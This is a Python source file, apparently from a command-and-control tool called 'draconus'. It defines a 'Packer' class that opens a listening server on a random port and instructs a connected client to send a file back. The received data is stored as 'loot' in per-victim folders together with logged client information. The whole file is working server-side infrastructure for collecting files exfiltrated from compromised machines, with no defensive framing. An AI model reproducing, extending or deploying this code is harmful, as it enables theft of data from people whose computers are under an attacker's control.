import socket
import os
import string
from threading import Thread, Lock
from random import randint
from typing import Union

class NameGenerator:
    def __init__(self):
        self.chars = string.ascii_letters + string.digits
        self.max = len(self.chars) - 1
    
    def generate(self, count: int = 10) -> str:
        c = 0
        data = ""
        while c < count:
            char = self.chars[randint(0, self.max)]
            data += char
            c += 1
        return data


class Packer(Thread):
    def __init__(self, draconus: object, handler: object):
        super().__init__(daemon=True)
        self.draco = draconus
        self.client = handler
        self.msg = self.draco.msg
        self.ip = self.draco.config.ip
        self.dir_out = self.draco.config.dir_output
        self.raw_len = self.draco.config.tcp_socket_raw_len
        self.dir_loot = os.path.join(self.dir_out, "LOOT")
        self.dir_storage = os.path.join(self.dir_loot, self.ip)
        self.port = None
        self.trying_number = 100
        self.download_TO = 10
        self.ready = False
        self.lock = Lock()
        self.generator = NameGenerator()
        self.gen_name_len = 25
    
    def port_allocation(self) -> bool:
        c = 0
        while c < self.trying_number:
            port = randint(20000, 50000)
            try:
                self.server.bind((self.ip, port))
                self.server.listen()
                self.port = port
                return True
            except:
                c += 1
                continue
        self.msg("error", "[!!] No free port found for the server [!!]")
        return False
    
    def build_server(self) -> bool:
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except OSError as e:
            self.msg("error", f"[!!] Cant build Packer Server: {e} [!!]")
            return False
        if not self.port_allocation():
            return False
        self.msg("dev", f"Packer Server '{self.ip}:{self.port}' build successfull. Ready to download files.")
        return True
    
    def prepare_storage(self) -> None:
        if not os.path.exists(self.dir_out):
            os.mkdir(self.dir_out)
        if not os.path.exists(self.dir_loot):
            os.mkdir(self.dir_loot)
        if not os.path.exists(self.dir_storage):
            os.mkdir(self.dir_storage)
        with self.lock:
            with open(os.path.join(self.dir_storage, "######Client_Info.txt"), "a+") as file:
                file.write("\n" + "#" * 100 + "\n")
                file.write(f"FILE NAME:  {self.name}\n")
                file.write(f"FILE LENGTH:  {self.file_len}\n")
                file.write(f"FILE TYPES: {str(self.types)}\n\n")
                file.write(self.client.client_data())
                file.write("\n" + "-" * 100 + "\n\n")
    
    def download_file_len(self, file_len: Union[str, int]) -> Union[None, bytes]:
        try:
            file_len = int(file_len)
        except:
            return None
        data = b""
        while len(data) < file_len:
            try:
                recv = self.conn.recv(file_len)
            except (ConnectionAbortedError, ConnectionResetError, ConnectionRefusedError):
                return None
            if recv:
                data += recv
            else:
                if len(data) < file_len:
                    return None
                else:
                    return data
        return data
    
    def download_file(self, raw_len: int = None) -> Union[None, bytes]:
        if not raw_len:
            raw_len = self.raw_len
        data = b""
        while True:
            try:
                recv = self.conn.recv(raw_len)
            except (ConnectionAbortedError, ConnectionResetError, ConnectionRefusedError):
                return None
            if recv:
                if len(recv) < self.raw_len:
                    data += recv
                    break
                else:
                    data += recv
            else:
                return None
        return data
    
    def save_loot(self, name: str, data: bytes) -> None:
        try:
            with open(os.path.join(self.dir_storage, name), "wb") as file:
                file.write(data)
            self.msg("msg", f"Save loot name: '{name}' from {self.client.client}")
        except Exception as e:
            self.msg("no-imp", f"[!!] ERROR: save file from: '{self.client.client}'")
    
    def work(self) -> None:
        self.prepare_storage()
        self.server.settimeout(self.download_TO)
        try:
            self.ready = True
            self.msg("dev", "Packer Start accepting connection")
            self.conn, self.addr = self.server.accept()
        except TimeoutError:
            self.msg("dev", "[!!] Packer Server Timeout [!!]")
            return
        except Exception as e:
            self.msg("dev", f"[!!] ERROR Packer Server: {e} [!!]")
            return
        if self.file_len:
            loot = self.download_file_len(self.file_len)
        else:
            loot = self.download_file()
        if not loot:
            self.msg("no-imp", f"[!!] ERROR: Downloading loot from {self.client.client}")
        else:
            self.msg("dev", "Download Complete")
            self.save_loot(self.name, loot)
    
    def close(self) -> None:
        try:
            self.conn.close()
        except:
            pass

    def set_opt(self, file_id: str, name: str = None, file_len: Union[str, int] = None, types: str = None) -> None:
        self.file_id = file_id    
        if not name:
            self.name = self.generator.generate(self.gen_name_len)
        else:
            self.name = name
        self.file_len = file_len
        self.types = types

    def run(self) -> None:
        if self.build_server():
            self.client.send_msg({"cmd": "packer", "ip" : self.ip, "port" : self.port, "file_id" : self.file_id})
            self.work()
            self.close()
        else:
            return
        
        
            
        
